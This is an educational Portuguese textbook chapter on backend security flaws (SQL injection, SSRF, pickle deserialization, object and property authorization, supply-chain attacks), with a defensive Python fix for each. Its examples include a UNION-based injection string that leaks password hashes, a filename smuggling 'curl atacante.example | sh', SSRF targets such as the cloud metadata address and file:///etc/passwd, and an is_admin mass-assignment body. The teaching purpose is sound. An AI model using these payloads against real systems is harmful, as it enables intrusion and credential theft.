# Vulnerabilidades de backend

## Onze jogos de fondue a um centavo

Noemi e Haroldo ganharam onze jogos de fondue, comprados a R$ 0,01 cada. Por sorte, o casal era de teste, a lista também, e quem mudou o preço e fez as compras foi a equipe do teste de intrusão. O relatório chegou numa sexta-feira às 17h40, com 31 páginas e um sumário executivo de uma linha só: "Conseguimos tudo". O caso é hipotético, mas cada detalhe dele já aconteceu em algum lugar. O sistema era uma API de listas de presentes de casamento, escrita em Python com FastAPI, SQLAlchemy e testes com 91% de cobertura.

Os achados críticos eram quatro, e cada um cabia numa linha de código:

1. A busca de presentes montava o SQL com f-string "só naquele endpoint, porque o ORM não fazia `ILIKE` direito".
2. A pré-visualização de links (o convidado cola a URL do produto e o backend busca título e foto) aceitava `http://169.254.169.254/` e devolveu, muito prestativa, as credenciais temporárias da máquina na nuvem.
3. A importação de listas de outro site aceitava um arquivo `pickle`, "porque era o formato que o script antigo gerava".
4. O endpoint `GET /usuarios/{id}` devolvia o modelo do ORM inteiro, com `hash_senha`, e o `PATCH` aceitava `is_admin` no corpo.

Havia ainda uma rota `/admin-temporario`, criada em 2021 para "resolver uma coisa rapidinho", que ninguém lembrava de ter publicado e que respondia sem autenticação. Por que, então, quatro vulnerabilidades de livro-texto apareceram juntas, e quais mecanismos fecham cada uma de verdade, em vez de só esconder o sintoma?

## As listas da OWASP e o que elas medem

A OWASP (Open Worldwide Application Security Project) publica duas listas que aparecem em todo contrato de segurança. Ambas são documentos de conscientização, montados a partir de dados de testes e de CVEs mapeados para categorias CWE (o catálogo de fraquezas do MITRE). Como padrão de verificação, a mesma organização mantém o ASVS.

O OWASP Top 10 cobre aplicações web em geral. Na edição de 2025, o primeiro lugar continua sendo Broken Access Control (falhas de controle de acesso), que agora absorve o SSRF, categoria própria em 2021. Software Supply Chain Failures ampliou a antiga categoria de componentes vulneráveis. Injeção caiu de posição, o que diz mais sobre a popularidade das consultas parametrizadas do que sobre a extinção do f-string. E entrou uma categoria nova, Mishandling of Exceptional Conditions: tratamento errado de erros e sistemas que falham abertos.

O OWASP API Security Top 10 (edição 2023) olha só para APIs, e por isso tem outra cara. Três das dez categorias são variações de autorização:

| Código | Nome | O que é |
|---|---|---|
| API1 | Broken Object Level Authorization (BOLA) | Acessar o objeto de outro trocando o ID |
| API3 | Broken Object Property Level Authorization (BOPLA) | Ler ou gravar campos que não deveria |
| API5 | Broken Function Level Authorization (BFLA) | Chamar uma função que não deveria (rota de admin) |
| API7 | Server Side Request Forgery | Fazer o servidor buscar uma URL arbitrária |
| API9 | Improper Inventory Management | Rotas e versões esquecidas, como `/admin-temporario` |

Injeção, SSRF e deserialização têm o mesmo padrão: o backend entrega um dado de fora a um interpretador (o parser de SQL, o shell, o cliente HTTP, o `pickle`) que trata parte dele como instrução. As seções seguintes descrevem cada mecanismo e a defesa que remove a mistura entre dado e instrução, em vez de tentar filtrar caracteres suspeitos.

## Injeção, ou quando o dado vira código

O banco recebe texto e o entrega ao parser. Se você concatena a entrada do usuário dentro desse texto, o parser não tem como saber onde termina a sua consulta e onde começa o termo de busca. Ele lê tudo como SQL, com a mesma boa vontade.

```python
termo = "%' UNION SELECT id, email, hash_senha FROM usuarios --"
sql = f"SELECT id, nome, loja FROM presentes WHERE nome ILIKE '%{termo}%'"
print(sql)
```

```text
SELECT id, nome, loja FROM presentes WHERE nome ILIKE '%%' UNION SELECT id, email, hash_senha FROM usuarios --%'
```

O apóstrofo fecha a string, o `UNION` acrescenta uma segunda consulta com o mesmo número de colunas e o `--` transforma o resto em comentário. A resposta da "busca de presentes" passa a listar e-mails e hashes de senha, formatados como se fossem um jogo de fondue e uma loja.

A defesa é a consulta parametrizada, e o mecanismo dela está no protocolo do PostgreSQL. No extended query protocol, o cliente manda uma mensagem `Parse` com o texto da consulta e marcadores `$1`, `$2`, e depois uma mensagem `Bind` com os valores, separados. O parser analisa o SQL antes de ver qualquer valor. Quando o valor chega, a árvore da consulta já está pronta, e o valor ocupa o lugar de um literal. Não existe sequência de caracteres capaz de virar SQL, porque o valor nunca passa pelo parser. O psycopg 3 usa esse binding no servidor por padrão:

```python
with conn.cursor() as cur:
    cur.execute(
        "SELECT id, nome, loja FROM presentes WHERE nome ILIKE %s",
        (f"%{termo}%",),
    )
    print(cur.fetchall())
```

```text
[]
```

Nenhum presente se chama `UNION SELECT id, email...`, e o banco responde exatamente isso. Escapar apóstrofos à mão depende de acertar todas as regras do dialeto e da codificação, e a história da segurança está cheia de escapes que esqueceram um caso.

Os parâmetros só substituem valores. Nomes de tabela, nomes de coluna e a direção do `ORDER BY` não podem ser parâmetros, e é por isso que o `?ordenar=preco` costuma ser o último f-string sobrevivente do código. Para identificadores, a defesa é uma lista fechada de valores aceitos e, para montar a consulta, `psycopg.sql.Identifier`, que cita o nome com aspas duplas. No SQLAlchemy, o ORM e o `select()` parametrizam sozinhos; o risco volta quando alguém escreve `text(f"...")`, que entrega a string pronta ao banco.

O mesmo mecanismo aparece em outros interpretadores. `subprocess.run(f"convert {arquivo} saida.png", shell=True)` entrega a string ao `/bin/sh`, e um arquivo chamado `foto.jpg; curl atacante.example | sh` passa a ser um script com dois comandos. A forma segura passa uma lista de argumentos sem `shell=True`, e o kernel recebe o nome do arquivo num único elemento de `argv`, sem shell nenhum para interpretar o `;`. Em templates, `jinja2.Template(texto_do_usuario)` deixa o usuário escrever expressões Jinja (*server-side template injection*); o template é código, e o usuário só deveria fornecer valores.

## SSRF, ou o servidor que busca o que mandarem

*Server-side request forgery* (SSRF) acontece quando o backend faz uma requisição para uma URL controlada pelo usuário. A requisição sai de dentro da rede, com as permissões de rede do servidor. Do ponto de vista do firewall, quem está pedindo é a sua própria aplicação, a funcionária mais confiável da empresa.

Os alvos clássicos são o serviço de metadados da instância na nuvem, em `169.254.169.254` (um endereço link-local que, em vários provedores, entrega credenciais temporárias do papel da máquina), o `localhost`, onde mora o Redis sem senha "porque só escuta local", e a rede privada inteira, com suas APIs internas sem autenticação.

Os provedores reagiram no serviço de metadados. Na AWS, o IMDSv2 exige um `PUT` que devolve um token de sessão, enviado depois num cabeçalho; no Google Cloud, toda leitura exige o cabeçalho `Metadata-Flavor: Google`. Um SSRF típico só controla a URL de um `GET` e esbarra nas duas exigências. Isso fecha o alvo mais valioso e deixa o resto da rede interna aberto.

Na aplicação, a defesa depende do que a funcionalidade precisa alcançar. Se ela só fala com destinos conhecidos (o gateway de pagamento, a API de frete), uma lista fechada de hosts resolve, e o resto desta seção vira cultura geral. A pré-visualização de links precisa aceitar qualquer site da internet, e aí a checagem tem de ser feita sobre o endereço IP, depois da resolução de DNS:

```python
import ipaddress
import socket
from urllib.parse import urlsplit


class DestinoProibido(Exception):
    pass


def resolver_destino_publico(url: str) -> tuple[str, str, int]:
    partes = urlsplit(url)
    if partes.scheme not in {"http", "https"}:
        raise DestinoProibido(f"esquema {partes.scheme!r}")
    if not partes.hostname:
        raise DestinoProibido("URL sem host")
    porta = partes.port or (443 if partes.scheme == "https" else 80)

    enderecos = socket.getaddrinfo(partes.hostname, porta, proto=socket.IPPROTO_TCP)
    ips = {info[4][0] for info in enderecos}
    for texto in sorted(ips):
        ip = ipaddress.ip_address(texto)
        if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped:
            ip = ip.ipv4_mapped
        if not ip.is_global:
            raise DestinoProibido(f"{partes.hostname} -> {ip}")
    # Devolve um IP já validado: a conexão vai para ele, e não para um novo DNS.
    return partes.hostname, sorted(ips)[0], porta


for url in [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:6379/",
    "http://[::ffff:10.0.0.7]/",
    "file:///etc/passwd",
    "https://93.184.215.14/produto/fondue",
]:
    try:
        print("ok      ", url, "->", resolver_destino_publico(url)[1])
    except DestinoProibido as erro:
        print("recusada", url, "|", erro)
```

```text
recusada http://169.254.169.254/latest/meta-data/ | 169.254.169.254 -> 169.254.169.254
recusada http://127.0.0.1:6379/ | 127.0.0.1 -> 127.0.0.1
recusada http://[::ffff:10.0.0.7]/ | ::ffff:10.0.0.7 -> 10.0.0.7
recusada file:///etc/passwd | esquema 'file'
ok       https://93.184.215.14/produto/fondue -> 93.184.215.14
```

A função valida o esquema, porque `file://` também é URL e há clientes que a aceitam com entusiasmo. Valida todos os IPs que o DNS devolveu, e não o texto da URL: um bloqueio por string ("recusar se contiver `169.254`") perde para `http://[::ffff:a9fe:a9fe]/`, para a forma decimal do endereço e para qualquer domínio cujo registro A aponte para `10.0.0.7`. E usa `is_global`, que segue o registro de endereços especiais da IANA, e não uma lista de faixas copiada de um fórum em 2017.

Falta o intervalo entre validar e conectar. Se o código valida o hostname e entrega a URL original ao cliente HTTP, o cliente resolve o DNS de novo, e um domínio com TTL zero pode responder um IP público na primeira consulta e `127.0.0.1` na segunda. É o *DNS rebinding*: o validador aprova um endereço e o cliente visita outro. Por isso a função devolve o IP, e a conexão vai para ele, com o hostname original no cabeçalho `Host` e no SNI do TLS (o que exige configurar o transporte do cliente). Redirecionamentos têm o mesmo problema, já que um `302` para o serviço de metadados é uma URL nova que ninguém validou. Ou o cliente não segue redirecionamentos (`follow_redirects=False` é o padrão do httpx), ou cada salto passa pela validação. Some timeout curto e limite de tamanho, porque baixar 40 GB para ler um `<title>` é um jeito caro de gerar miniatura.

A camada que não depende de o código Python estar certo é a rede. Um proxy de saída aplica a regra num lugar só (o Smokescreen, publicado pela Stripe, é um exemplo de código aberto), e um firewall de saída que isola a sub-rede do banco continua valendo no dia em que alguém escrever um segundo endpoint de "buscar URL" e esquecer o validador. Esse dia chega, e costuma chegar numa sexta.

## Deserialização, ou o arquivo que traz o próprio código

O módulo `pickle` guarda um programa para uma pequena máquina de pilha, e o `pickle.loads` é o interpretador dela. Desmontar o pickle de uma data inofensiva mostra o mecanismo:

```python
import datetime
import pickle
import pickletools

pickletools.dis(pickle.dumps(datetime.date(2026, 5, 16), protocol=4))
```

```text
    0: \x80 PROTO      4
    2: \x95 FRAME      32
   11: \x8c SHORT_BINUNICODE 'datetime'
   21: \x94 MEMOIZE    (as 0)
   22: \x8c SHORT_BINUNICODE 'date'
   28: \x94 MEMOIZE    (as 1)
   29: \x93 STACK_GLOBAL
   30: \x94 MEMOIZE    (as 2)
   31: C    SHORT_BINBYTES b'\x07\xea\x05\x10'
   37: \x94 MEMOIZE    (as 3)
   38: \x85 TUPLE1
   39: \x94 MEMOIZE    (as 4)
   40: R    REDUCE
   41: \x94 MEMOIZE    (as 5)
   42: .    STOP
highest protocol among opcodes = 4
```

`STACK_GLOBAL` importa um objeto pelo nome do módulo e do atributo, aqui `datetime.date`. `REDUCE` chama esse objeto com a tupla que está na pilha. Para um arquivo vindo de fora, isso significa que quem escreveu os bytes escolhe qual função importável do seu processo será chamada e com quais argumentos, inclusive as que executam comandos. A documentação do Python avisa, numa caixa de destaque que todo mundo pula, que só se deve fazer unpickle de dados confiáveis. "Validar o pickle depois de carregar" também não existe: quando a validação começaria, o código do arquivo já rodou.

O mesmo vale para o `yaml.load` com o `Loader` completo do PyYAML, para o `shelve` (pickle por baixo) e para o `torch.load`, que só passou a carregar apenas pesos por padrão no PyTorch 2.6. Modelos de machine learning baixados da internet são, por esse caminho, programas baixados da internet.

A importação da história trocou o `pickle` por JSON validado com Pydantic. O JSON tem seis tipos, e nenhum deles é "chame esta função". Quando os dois lados são seus (um cache interno, uma fila entre dois serviços seus), assinar os bytes com HMAC e verificar antes de desserializar garante que eles saíram de quem tem a chave. Se o formato for pickle, essa garantia dura até o dia em que a chave vazar.

## Autorização por objeto e por propriedade

Trocar o ID na URL e ver o pedido de outro cliente é a BOLA, primeiro lugar da lista de APIs desde 2019. O capítulo 31 trata dela em detalhe; a versão curta é que a própria consulta filtra pelo dono (`WHERE lista_id = %s AND dono_id = %s`) e que um objeto alheio responde 404.

A BOPLA é a mesma falha um nível abaixo: o usuário pode acessar o objeto, mas não todos os campos dele. Ela tem duas direções. Na leitura, é a exposição excessiva de dados: o endpoint devolve o modelo do ORM inteiro e conta com o frontend para esconder o `hash_senha`. O `curl` não tem frontend. Na escrita, chama-se *mass assignment*: o código copia todos os campos do corpo para o objeto, e o corpo traz um campo que ninguém pôs no formulário.

```python
# O formulário tem 3 campos. O corpo da requisição tem quantos o cliente quiser.
for campo, valor in corpo.items():
    setattr(usuario, campo, valor)
```

A defesa é declarar, para cada direção, quais campos existem:

```python
from fastapi import Depends
from pydantic import BaseModel, ConfigDict


class UsuarioAtualizacao(BaseModel):
    model_config = ConfigDict(extra="forbid")
    nome: str | None = None
    cidade: str | None = None


class UsuarioPublico(BaseModel):
    id: int
    nome: str


@app.patch("/usuarios/me", response_model=UsuarioPublico)
async def atualizar(
    dados: UsuarioAtualizacao, usuario: Usuario = Depends(usuario_atual)
):
    for campo, valor in dados.model_dump(exclude_unset=True).items():
        setattr(usuario, campo, valor)
    await sessao_de(usuario).commit()
    return usuario
```

Um `PATCH` com `{"nome": "Haroldo", "is_admin": true}` recebe `422 Unprocessable Entity`:

```json
{"detail":[{"type":"extra_forbidden","loc":["body","is_admin"],"msg":"Extra inputs are not permitted","input":true}]}
```

O `response_model` filtra a saída: a função devolve o objeto do ORM com 23 colunas e o JSON sai com duas. Recusar o campo extra, em vez de ignorá-lo em silêncio (o padrão do Pydantic), põe a tentativa de virar administrador no log.

A BFLA é a versão por função: o usuário está autenticado e ninguém checou se ele pode chamar aquela rota. O `/admin-temporario` somava BFLA com a API9, inventário: uma rota fora de qualquer documentação e de qualquer teste. Um teste que compara as rotas do app com as que dependem de uma checagem de autorização teria encontrado o `/admin-temporario` em 2021, quando ele ainda era temporário.

## Dependências, ou o código que você não escreveu

Um backend FastAPI instala dezenas de pacotes, a maioria dependência de dependência que ninguém escolheu. Há dois riscos ali.

O primeiro é a vulnerabilidade conhecida numa versão que você usa. O `pip-audit`, da PyPA, compara as versões instaladas com bases públicas como a OSV. O Jinja2 3.1.2, por exemplo, tem a GHSA-h5c8-rqwp-cp95 (CVE-2024-22195), um XSS no filtro `xmlattr` corrigido na 3.1.3 e completado na 3.1.4. Um lockfile (pip-tools, uv ou Poetry) fixa a versão exata de cada pacote; se ninguém o atualiza, ele congela também as vulnerabilidades.

O segundo risco é o pacote malicioso. Em 2021, Alex Birsan publicou no PyPI e no npm pacotes com nomes de pacotes internos de grandes empresas e versões mais altas. Com `--extra-index-url`, o pip trata o índice interno e o público como equivalentes e instala a maior versão que encontrar, e foi assim que o código dele rodou dentro de mais de 35 empresas, entre elas Apple, Microsoft e PayPal. O nome do ataque é *dependency confusion*. As defesas são um único índice (um proxy interno que espelha o PyPI) e hashes no lockfile (`--require-hashes`), que fazem o pip recusar qualquer arquivo diferente do revisado.

Hash nenhum protege contra o mantenedor legítimo. Em março de 2024, Andres Freund investigava por que logins por SSH num Debian de testes gastavam CPU demais (cerca de meio segundo a mais) e encontrou um backdoor nas versões 5.6.0 e 5.6.1 do xz/liblzma (CVE-2024-3094). Ele foi inserido por um colaborador que passou cerca de dois anos ganhando a confiança do projeto, e foi descoberto por um engenheiro que não tolerou meio segundo de latência.

## Propriedades e custos

| Defesa | O que garante | O que não cobre | Custo |
|---|---|---|---|
| Consulta parametrizada | Valor nunca vira SQL | Identificadores dinâmicos (`ORDER BY`) | Quase zero |
| Validação de IP após DNS, com IP fixado | Destino público no momento da conexão | Serviço interno publicado com IP público | Código por cliente HTTP, testes |
| Proxy ou firewall de saída | A regra vale para todo código, inclusive o esquecido | Destinos permitidos usados de forma errada | Infraestrutura, um salto de rede |
| JSON com schema no lugar de pickle | Dado não executa código | Dado válido usado de forma errada | Migrar formatos legados |
| Modelos de entrada e saída | Só campos declarados entram e saem | Qual objeto (BOLA) | Um modelo por direção e por recurso |
| Lockfile, hashes e auditoria | Mesmo código em todo build, CVE conhecido detectado | Zero-day, mantenedor malicioso | Rotina de atualização |
| WAF na borda | Bloqueia padrões conhecidos | Variações codificadas, lógica de autorização | Falsos positivos, regras para manter |

O WAF (*web application firewall*) olha o texto da requisição e tenta adivinhar intenção, o método que a seção de injeção mostrou falhar. Ele ganha tempo entre uma CVE e o deploy da correção; no lugar das consultas parametrizadas, vira um filtro de apóstrofos com contrato anual.

## Armadilhas e casos reais

> **Na vida real:** em 2019, a Capital One teve dados de cerca de 100 milhões de pessoas nos Estados Unidos e 6 milhões no Canadá expostos. Segundo as análises públicas, um WAF mal configurado permitia SSRF, a requisição chegou ao serviço de metadados (na versão sem token) e as credenciais do papel da instância liam buckets de armazenamento.

> **Na vida real:** a Equifax foi invadida em 2017 por uma falha no Apache Struts (CVE-2017-5638) cuja correção tinha sido publicada em março. A invasão começou em maio, e os dados de cerca de 147 milhões de pessoas saíram ao longo de meses (relatório do GAO), com a correção a uma atualização de distância.

> **Armadilha:** a checagem que falha aberta. `except Exception: return True` dentro de uma função de autorização transforma qualquer erro (o serviço de permissões fora do ar, um `None` inesperado) em acesso liberado. É o que descreve a categoria nova da OWASP, Mishandling of Exceptional Conditions.

## Resumo

- Injeção, SSRF e deserialização têm o mesmo mecanismo: dado externo chega a um interpretador que trata parte dele como instrução.
- Consultas parametrizadas separam texto e valores no protocolo; identificadores usam lista fechada. Idem `subprocess` sem `shell=True`.
- SSRF: validar esquema e todos os IPs resolvidos, conectar ao IP validado, revalidar redirecionamentos, fechar a saída na rede.
- `pickle` e similares executam código ao carregar; dado externo entra como JSON validado.
- BOLA, BOPLA e BFLA: filtrar pelo dono, declarar campos de entrada e de saída, conferir que toda rota tem autorização.
- Dependências: auditoria contra bases públicas, lockfile atualizado, índice único e hashes.
- Erros em checagens de segurança resultam em negação.

## Referências

- OWASP Top 10:2025: <https://owasp.org/Top10/2025/>
- OWASP API Security Top 10 (2023): <https://owasp.org/API-Security/editions/2023/en/0x11-t10/>
- OWASP Application Security Verification Standard: <https://owasp.org/www-project-application-security-verification-standard/>
- OWASP, *Server Side Request Forgery Prevention Cheat Sheet*: <https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html>
- PostgreSQL, *Message Flow* (extended query protocol): <https://www.postgresql.org/docs/current/protocol-flow.html>
- Python, documentação do módulo `pickle`: <https://docs.python.org/3/library/pickle.html>
- Python, documentação do módulo `ipaddress`: <https://docs.python.org/3/library/ipaddress.html>
- AWS, *Use the Instance Metadata Service to access instance metadata* (IMDSv2): <https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html>
- Stripe, Smokescreen: <https://github.com/stripe/smokescreen>
- PyPA, pip-audit: <https://github.com/pypa/pip-audit>
- OSV, GHSA-h5c8-rqwp-cp95: <https://osv.dev/vulnerability/GHSA-h5c8-rqwp-cp95>
- Alex Birsan, *Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies* (2021): <https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610>
- Andres Freund, *backdoor in upstream xz/liblzma leading to ssh server compromise*, oss-security (29/03/2024): <https://www.openwall.com/lists/oss-security/2024/03/29/4>
- NVD, CVE-2024-3094: <https://nvd.nist.gov/vuln/detail/CVE-2024-3094>
- U.S. GAO, *Data Protection: Actions Taken by Equifax and Federal Agencies in Response to the 2017 Breach* (GAO-18-559): <https://www.gao.gov/products/gao-18-559>
- Brian Krebs, *What We Can Learn from the Capital One Hack* (2019): <https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/>